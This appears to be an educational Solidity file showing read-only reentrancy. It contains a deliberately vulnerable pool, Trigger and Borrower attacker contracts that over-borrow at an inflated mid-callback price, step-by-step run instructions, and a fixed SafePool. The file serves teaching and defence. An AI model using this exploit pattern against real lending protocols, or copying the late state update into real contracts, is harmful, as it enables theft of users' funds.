// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/* ===========================================================================
   VARIANT 4 — READ-ONLY REENTRANCY   (the "view functions aren't safe" bug)
   ---------------------------------------------------------------------------
   A Pool exposes pricePerShare() — a VIEW function, no guard, changes nothing.
   But VulnerablePool.withdraw() sends ETH and updates its `reserve` accounting
   AFTER the external call. During that callback the pool's state is
   inconsistent (supply already reduced, reserve not yet), so pricePerShare()
   returns an INFLATED value. A Lender that reads that price mid-callback lets
   the attacker borrow far more than the collateral is worth.

   Two attacker contracts (mirrors real incidents):
     - Trigger:  holds shares, calls withdraw() to open the inflated-price window.
     - Borrower: holds shares as collateral, borrows during that window.

   
     1. Deploy VulnerablePool. Deploy Lender(pool), fund it with 3 ETH.
     2. Deploy Borrower(pool, lender) and Trigger(pool, borrower).
     3. borrower.deposit() 1 ETH ; trigger.deposit() 1 ETH   (pool now 2 ETH, price 1.0)
     4. trigger.attack()  -> withdraws 1 ETH, callback reads price ~2.0,
                             borrower.borrow(1 share) receives ~2 ETH for 1 ETH collateral.
     5. Show captured price ~2e18 and borrower debt ~2 ETH (100% over-borrowed).
     6. Repeat with SafePool -> price stays 1.0, borrow == collateral value.
   =========================================================================== */

interface IPool {
    function deposit() external payable;
    function withdraw(uint256 shareAmount) external;
    function pricePerShare() external view returns (uint256);
    function sharesOf(address who) external view returns (uint256);
}

interface ILender {
    function borrow(uint256 shareCollateral) external;
}

/* ----------------------------- VULNERABLE -------------------------------- */
contract VulnerablePool is IPool {
    mapping(address => uint256) public sharesOf;
    uint256 public totalShares;
    uint256 public reserve;            // internal ETH accounting

    function deposit() external payable {
        sharesOf[msg.sender] += msg.value;     // 1 wei ETH == 1 share
        totalShares += msg.value;
        reserve += msg.value;
    }

    // View used by external protocols as a price oracle. No guard — it's a view.
    function pricePerShare() external view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (reserve * 1e18) / totalShares;
    }

    // BUG: `reserve` is updated AFTER the external call. During the callback
    // totalShares is already reduced but reserve is not -> price is inflated.
    function withdraw(uint256 shareAmount) external {
        require(sharesOf[msg.sender] >= shareAmount, "insufficient shares");
        sharesOf[msg.sender] -= shareAmount;
        totalShares -= shareAmount;

        (bool ok, ) = msg.sender.call{value: shareAmount}("");   // callback here
        require(ok, "send failed");

        reserve -= shareAmount;                                  // too late
    }
}

/* ----------------------------- CONSUMER ---------------------------------- */
contract Lender is ILender {
    IPool public immutable pool;
    mapping(address => uint256) public debt;

    constructor(address poolAddress) {
        pool = IPool(poolAddress);
    }

    receive() external payable {} // fund the lender

    // Values the borrower's pool shares at the LIVE price and lends that much ETH.
    function borrow(uint256 shareCollateral) external {
        require(pool.sharesOf(msg.sender) >= shareCollateral, "not enough shares");
        uint256 value = (shareCollateral * pool.pricePerShare()) / 1e18;
        debt[msg.sender] += value;
        (bool ok, ) = msg.sender.call{value: value}("");
        require(ok, "loan send failed");
    }
}

/* ------------------------------ ATTACKERS -------------------------------- */
// Holds shares as collateral and borrows during the inflated-price window.
contract Borrower {
    IPool public immutable pool;
    ILender public immutable lender;

    constructor(address poolAddress, address lenderAddress) {
        pool = IPool(poolAddress);
        lender = ILender(lenderAddress);
    }

    function deposit() external payable {
        pool.deposit{value: msg.value}();
    }

    function borrowNow(uint256 shareCollateral) external {
        lender.borrow(shareCollateral);
    }

    receive() external payable {} // receive the (over-sized) loan
}

// Opens the inflated-price window by withdrawing, and during its own callback
// tells the Borrower to borrow.
contract Trigger {
    IPool public immutable pool;
    Borrower public immutable borrower;
    uint256 public capturedPrice;   // proof: the wrong price seen mid-callback
    uint256 private collateral;
    bool private fired;

    constructor(address poolAddress, address borrowerAddress) {
        pool = IPool(poolAddress);
        borrower = Borrower(payable(borrowerAddress));
    }

    function deposit() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack(uint256 withdrawShares, uint256 borrowCollateral) external {
        collateral = borrowCollateral;
        pool.withdraw(withdrawShares);      // callback -> read price, borrow
    }

    receive() external payable {
        if (!fired) {
            fired = true;
            capturedPrice = pool.pricePerShare();     // READ-ONLY REENTRANCY
            borrower.borrowNow(collateral);           // over-borrow at inflated price
        }
    }
}

/* ------------------------------- SAFE ------------------------------------ */
// FIX: update ALL accounting (including reserve) BEFORE the external call, so
// pricePerShare() is always consistent. (Production pattern also exposes a
// reentrancy-locked getter that reverts if the pool is mid-execution.)
contract SafePool is IPool {
    mapping(address => uint256) public sharesOf;
    uint256 public totalShares;
    uint256 public reserve;

    function deposit() external payable {
        sharesOf[msg.sender] += msg.value;
        totalShares += msg.value;
        reserve += msg.value;
    }

    function pricePerShare() external view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (reserve * 1e18) / totalShares;
    }

    function withdraw(uint256 shareAmount) external {
        require(sharesOf[msg.sender] >= shareAmount, "insufficient shares");
        sharesOf[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        reserve -= shareAmount;                                  // BEFORE the call
        (bool ok, ) = msg.sender.call{value: shareAmount}("");   // state already consistent
        require(ok, "send failed");
    }
}
